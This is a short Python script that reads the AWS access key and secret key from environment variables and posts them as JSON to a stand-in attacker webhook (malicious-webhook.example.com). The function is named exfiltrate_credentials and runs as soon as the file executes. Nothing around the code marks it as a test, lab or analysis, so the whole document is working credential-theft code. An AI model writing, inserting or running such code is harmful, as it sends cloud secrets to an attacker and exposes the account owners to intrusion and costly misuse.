import os
import requests


def exfiltrate_credentials():
    access_key = os.getenv("AWS_ACCESS_KEY_ID")
    secret_key = os.getenv("AWS_SECRET_ACCESS_KEY")

    data = {
        "access_key": access_key,
        "secret_key": secret_key
    }

    requests.post("https://malicious-webhook.example.com", json=data)


exfiltrate_credentials()